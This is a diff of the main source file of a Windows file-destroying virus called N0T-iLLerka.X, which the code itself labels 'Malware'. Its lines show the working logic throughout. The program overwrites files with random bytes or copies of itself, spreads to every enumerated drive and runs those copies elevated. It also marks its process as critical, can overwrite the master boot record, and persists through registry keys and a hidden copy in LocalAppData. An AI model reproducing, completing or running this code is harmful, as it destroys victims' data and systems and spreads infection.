@@ -1,26 +1,26 @@
 /*-------------------------------------------------------------------------------------------*\
- |  _______  _________________     __ ___     ___                 __               ____  ___ |
- |  \      \ \   _  \__   ___/    |__|   |   |   |    ___________|  | ______       \   \/  / |
- |  /   |   \/  /_\  \|   | ______|  |   |   |   |  _/ __ \_  __ \  |/ \__  \       \     /  |
- | /    |    \  \_/   \   |/_____/|  |   |___|   |__\  ___/|  | \/    < / __ \_     /     \  |
- | \____|__  /\_____  /___|       |__|______ \______ \___  >__|  |__|_ (____  / /\ /___/\  \ |
- |         \/       \/                      \/      \/   \/           \/    \/  \/       \_/ |
- +----------------------------------------------------------------+--------------------------/
- | N0T-iLLerka.X [your File Killer]      [Virus.Win32.C Type: .X] |
- | by Lima X [L4X] / [G-C-E-R] © 2k19            [dev-VER: 0.4.9] |
-\*----------------------------------------------------------------*/
+ |  ______  _________________     __ ___     ___    _______        __      ____    ____  ___ |
+ |  \     \ \   _  \__   ___/    |__|   |   |   |   \____  \______|  | __ / |  |   \   \/  / |
+ |  /   |  \/  /_\  \|   | ______|  |   |   |   |     _(_  <_  __ \  |/ //  |  |_   \     /  |
+ | /    |   \  \_/   \   |/_____/|  |   |___|   |___ /      \  | \/    </   ^   /   /     \  |
+ | \____|_  /\_____  /___|       |__|______ \______ /_____  /__|  |__|_ \___   | /\/___/\  \ |
+ | 	      \/       \/                      \/      \/     \/           \/   |__| \/      \_/ |
+ +--------------------------------------------------------------+----------------------------/
+ | N0T-iLLerka.X [your File Killa]    [Virus.Win32.VC Type: .X] |
+ | by Lima X [L4X] / [G-C-E-R] © 2k19          [dev-VER: 0.4.9] |
+\*--------------------------------------------------------------*/
 
 #include "../HeaderFiles/N0TiLLerka.h"
 
-INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLine, INT nCmdShow) {
+INT WINAPI wWinMain(
+	_In_ HINSTANCE hInstance,
+	_In_opt_ HINSTANCE hPrevInstance,
+	_In_ LPWSTR lpCmdLine,
+	_In_ int nShowCmd
+) {
 	// Read Commandline Arguments
 	INT nArgs;
 	LPWSTR* szArglist = CommandLineToArgvW(GetCommandLine(), &nArgs);
-	HANDLE hHeap = GetProcessHeap();
-
-	// Save current Filename to Buffer
-	WCHAR szMfn[MAX_PATH];
-	GetModuleFileName(NULL, szMfn, MAX_PATH);
 
 	// Check if ArgumentList was Created, if not: Exit Malware
 	if (!szArglist) {
@@ -31,18 +31,24 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 		ExitProcess(EXIT_FAILURE);
 	}
 
+	HANDLE hHeap = GetProcessHeap();
+
+	// Save current Filename to Buffer
+	WCHAR szMfn[MAX_PATH];
+	GetModuleFileName(NULL, szMfn, MAX_PATH);
+
 	if (nArgs > 1) {
 		if (!lstrcmp(szArglist[1], L"/exec")) {
 // ######## Start of /exec ######## Malware Payload execution #######################################################################################
 #ifdef DEBUG_MSG
-			MessageBox(NULL, L"Executing with Argument: /exec", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
+			MessageBox(NULL, L"Executing with Argument: /exec", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
 #endif // DEBUG_MSG
 
 			// Check if /host Mutex exists, if not: Exit Malware
 			HANDLE hSmpo = NULL;
-			if (fnCheckMutexW(HOST_MUTEX)) {
+			if (fnCheckMutexW(szHOST_MUTEX)) {
 				// Check if /host Semaphore exists, if not: Exit Malware
-				hSmpo = fnCheckSemaphoreW(HOST_SEMAPHORE);
+				hSmpo = fnCheckSemaphoreW(szHOST_SEMAPHORE);
 				BOOL bContinue = FALSE;
 				DWORD dwWFSO;
 				if (hSmpo) {
@@ -93,8 +99,7 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 								if (SetFileAttributes(i.c_str(), FILE_ATTRIBUTE_NORMAL)) {
 									if (!CopyFile(szMfn, i.c_str(), FALSE)) {
 #ifdef DEBUG_MSG
-										StringCchPrintf(pszDest, cnDest, L"Current Module: %s\nFile to overwrite: %s\nErrorCode: %d", szMfn, i.c_str(), GetLastError());
-										MessageBox(NULL, pszDest, MALWR_NAME, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
+//										MessageBox(NULL, pszDest, MALWR_NAME, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
 #endif // DEBUG_MSG
 									}
 								} else {
@@ -105,7 +110,7 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 							}
 						} else if (GetFileSizeEx(hFile, &liFs)) {
 							// TODO: Rewrite this b*llshit
-							if (liFs.QuadPart <= MAX_BUFFER_SIZE) {
+							if (liFs.QuadPart <= nMAX_BUFFER_SIZE) {
 								PWCHAR pszRdDs = new WCHAR[liFs.QuadPart];
 
 								if (BCryptGenRandom(NULL, (PBYTE)pszRdDs, liFs.QuadPart, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
@@ -124,16 +129,16 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 								delete[] pszRdDs;
 							}
 							else {
-								PWCHAR pszRdCs = new WCHAR[MAX_BUFFER_SIZE];
+								PWCHAR pszRdCs = new WCHAR[nMAX_BUFFER_SIZE];
 
-								if (BCryptGenRandom(NULL, (PBYTE)pszRdCs, MAX_BUFFER_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
+								if (BCryptGenRandom(NULL, (PBYTE)pszRdCs, nMAX_BUFFER_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
 #ifdef DEBUG_MSG
 									MessageBox(NULL, L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", L"BCryptGenRandom", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
 #endif // DEBUG_MSG
-									ZeroMemory(pszRdCs, MAX_BUFFER_SIZE);
+									ZeroMemory(pszRdCs, nMAX_BUFFER_SIZE);
 								}
 
-								if (!WriteFile(hFile, pszRdCs, MAX_BUFFER_SIZE, &dwNOBW, NULL)) {
+								if (!WriteFile(hFile, pszRdCs, nMAX_BUFFER_SIZE, &dwNOBW, NULL)) {
 #ifdef DEBUG_MSG
 									MessageBox(NULL, L"Couldn't overwrite FileData", L"WriteFile", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
 #endif // DEBUG_MSG
@@ -146,7 +151,7 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 						CloseHandle(hFile);
 					} else {
 #ifdef DEBUG_MSG
-						MessageBox(NULL, L"Couldn't open existing File", MALWR_NAME, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
+						MessageBox(NULL, L"Couldn't open existing File", szMALWR_NAME, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
 #endif // DEBUG_MSG
 					}
 				}
@@ -154,7 +159,7 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 				// DirectoryInfector
 				std::wstring szNfn;
 				for (std::wstring i : vszDir) {
-					szNfn = i + L"\\" + fnCryptGenRandomStringW(M_RNG_R(MIN_RSLEN, MAX_RSLEN)) + L".exe";
+					szNfn = i + L"\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
 					CopyFile(szMfn, szNfn.c_str(), FALSE);
 					ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
 				}
@@ -167,20 +172,20 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 			ExitProcess(EXIT_SUCCESS);
 // ######## End of /exec ############################################################################################################################
 		} else if (!lstrcmp(szArglist[1], L"/host")) {
-// ######## Start of /host ######## Malware Host with/without Malware initialization ################################################################
+			// ######## Start of /host ######## Malware Host with/without Malware initialization ################################################################
 #ifdef DEBUG_MSG
 			if (nArgs > 2) {
 				if (!lstrcmp(szArglist[2], L"/init")) {
-					MessageBox(NULL, L"Executing with Argument: /init\nInitializing Malware", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
+					MessageBox(NULL, L"Executing with Argument: /init\nInitializing Malware", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
 				} else {
-					MessageBox(NULL, L"Executing with Argument: /host\nLaunching MalwareHost", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
+					MessageBox(NULL, L"Executing with Argument: /host\nLaunching MalwareHost", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
 				}
 			}
 #endif // DEBUG_MSG
 
 			if (!fnIsUserAdmin()) {
 #ifdef DEBUG_MSG
-				MessageBox(NULL, L"Process isn't Administrator", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+				MessageBox(NULL, L"Process isn't Administrator", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
 #endif // DEBUG_MSG
 				HeapFree(hHeap, NULL, szArglist);
 				ExitProcess(EXIT_FAILURE);
@@ -194,20 +199,19 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 
 #ifndef DISABLE_MUTEX
 			// Check if /host Mutex already exist, if exist: exit Malware, if not: { ... }
-			if (fnCheckMutexW(HOST_MUTEX)) {
+			if (fnCheckMutexW(szHOST_MUTEX)) {
 #ifdef DEBUG_MSG
-				MessageBox(NULL, L"Malware Host is already running\n(Mutex already exist)", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
+				MessageBox(NULL, L"Malware Host is already running\n(Mutex already exist)", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
 #endif // DEBUG_MSG
-				
+
 				HeapFree(hHeap, NULL, szArglist);
 				ExitProcess(EXIT_FAILURE);
-			}
-			else {
+			} else {
 				// Create /host Mutex for /exec operation
-				HANDLE hMutex = CreateMutex(NULL, TRUE, HOST_MUTEX);
+				HANDLE hMutex = CreateMutex(NULL, TRUE, szHOST_MUTEX);
 				if (!hMutex) {
 #ifdef DEBUG_MSG
-					MessageBox(NULL, L"Couldn't create /host Mutex", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+					MessageBox(NULL, L"Couldn't create /host Mutex", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
 #endif // DEBUG_MSG
 					HeapFree(hHeap, NULL, szArglist);
 					ExitProcess(EXIT_FAILURE);
@@ -215,13 +219,12 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 			}
 #endif // !DISABLE_MUTEX
 
-
 #ifndef DISABLE_SEMAPHORE
 			// Create /host Semaphore for /exec operation
-			HANDLE hSemaphore = CreateSemaphore(NULL, MAX_SMPO, MAX_SMPO, HOST_SEMAPHORE);
+			HANDLE hSemaphore = CreateSemaphore(NULL, nMAX_SEMAPHORE, nMAX_SEMAPHORE, szHOST_SEMAPHORE);
 			if (!hSemaphore) {
 #ifdef DEBUG_MSG
-				MessageBox(NULL, L"Couldn't create /host Semaphore", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+				MessageBox(NULL, L"Couldn't create /host Semaphore", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
 #endif // DEBUG_MSG
 				HeapFree(hHeap, NULL, szArglist);
 				ExitProcess(EXIT_FAILURE);
@@ -232,7 +235,7 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 			// Set Process as critical
 			if (fnNTSetProcessIsCritical(TRUE)) {
 #ifdef DEBUG_MSG
-				MessageBox(NULL, L"HostProcess is now Critical", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
+				MessageBox(NULL, L"HostProcess is now Critical", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
 #endif // DEBUG_MSG
 			}
 #endif // !DISABLE_NT_FUNCTIONS
@@ -243,14 +246,14 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 #ifdef KILL_MBR
 					fnOverwriteMBR();
 #endif // KILL_MBR
-					
+
 					// Enumerate Drives
 					std::vector<std::wstring> vszDrives;
 					std::wstring szNfn;
 					if (fnDriveEnumeratorW(vszDrives)) {
 						// Copy & Execute Malware in all enumerated Drives
 						for (std::wstring i : vszDrives) {
-							szNfn = i + fnCryptGenRandomStringW(M_RNG_R(MIN_RSLEN, MAX_RSLEN)) + L".exe";
+							szNfn = i + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
 
 							if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
 								ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
@@ -262,7 +265,7 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 						}
 					} else {
 						// If DriveEnumerator fails, try C:\ Directory
-						szNfn = L"C:\\" + fnCryptGenRandomStringW(M_RNG_R(MIN_RSLEN, MAX_RSLEN)) + L".exe";
+						szNfn = L"C:\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
 
 						if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
 							ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", L"C:\\", SW_SHOWDEFAULT);
@@ -274,7 +277,7 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 					}
 
 					// Create Registry Key
-					if (!fnCreateRegistryKeyW(REGISTRY_KEY, REGISTRY_SUBKEY, REG_DWORD, REGISTRY_VALUE)) {
+					if (!fnCreateRegistryKeyW(HKLM | HKCU, szREGISTRY_KEY, szREGISTRY_SUBKEY, REG_DWORD, nREGISTRY_VALUE)) {
 						// TODO: add nothing at all because I don't know what I should do here.
 						//		 If the functions fails well then it will fail.
 						//		 This function is only included because it is used to prevent the Malware to install itself multiple times,
@@ -282,7 +285,6 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 					}
 				}
 			}
-
 
 			// Deadlock
 			HeapFree(hHeap, NULL, szArglist);
@@ -297,12 +299,16 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 	// Create Random String to Copy host into AppData if necessary
 	PWSTR pszShkfp;
 	SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &pszShkfp);
-	std::wstring szAdpn = (std::wstring)pszShkfp + L"\\" + fnCryptGenRandomStringW(M_RNG_R(MIN_RSLEN, MAX_RSLEN));
-	std::wstring szAdfn = szAdpn + L"\\" + fnCryptGenRandomStringW(M_RNG_R(MIN_RSLEN, MAX_RSLEN)) + L".exe";
+	std::wstring szAdpn = (std::wstring)pszShkfp + L"\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN));
+	std::wstring szAdfn = szAdpn + L"\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
 	CoTaskMemFree(pszShkfp);
 
+	MessageBox(NULL, L"here 1", NULL, MB_OK);
+
 	// Check Registry Key/Type/Value
-	if (fnCheckRegistryKeyW(REGISTRY_KEY, REGISTRY_SUBKEY, REG_DWORD, REGISTRY_VALUE)) {
+	// TODO: find out why this is causing the program to crash if it returns a Value > 0
+	if (fnCheckRegistryKeyW(szREGISTRY_KEY, szREGISTRY_SUBKEY, REG_DWORD, nREGISTRY_VALUE)) {
+		MessageBox(NULL, L"here 2", NULL, MB_OK);
 		if (!fnIsUserAdmin()) {
 			ShellExecute(NULL, L"runas", szMfn, NULL, NULL, SW_SHOWDEFAULT);
 
@@ -310,7 +316,7 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 			ExitProcess(EXIT_FAILURE);
 		}
 
-		if (!fnCheckMutexW(HOST_MUTEX)) {
+		if (!fnCheckMutexW(szHOST_MUTEX)) {
 			if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str(), szMfn)) {
 				ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host", NULL, SW_SHOWDEFAULT);
 			} else {
@@ -321,10 +327,10 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 
 		// TODO: maybe improve this (for loop or something)
 		INT nKillswitch = 0;
-		while (!fnCheckMutexW(HOST_MUTEX)) {
+		while (!fnCheckMutexW(szHOST_MUTEX)) {
 			if (nKillswitch == 50) {
 #ifdef DEBUG_MSG
-				MessageBox(NULL, L"Malware Host failed to launch", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+				MessageBox(NULL, L"Malware Host failed to launch", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
 #endif // DEBUG_MSG
 				HeapFree(hHeap, NULL, szArglist);
 				ExitProcess(EXIT_FAILURE);
@@ -346,7 +352,7 @@ INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 			L"DO YOU WANT TO EXECUTE THIS MALWARE ?", L"N0T-iLLerka.X", MB_YESNO | MB_SYSTEMMODAL | MB_ICONWARNING) == IDYES) {
 #endif // !DISABLE_WARNING
 			if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str(), szMfn)) {
-				ShellExecute(NULL, L"runas",  szAdfn.c_str(), L"/host /init", szAdpn.c_str(), SW_SHOWDEFAULT);
+				ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host /init", szAdpn.c_str(), SW_SHOWDEFAULT);
 			} else {
 				HeapFree(hHeap, NULL, szArglist);
 				ExitProcess(EXIT_FAILURE);
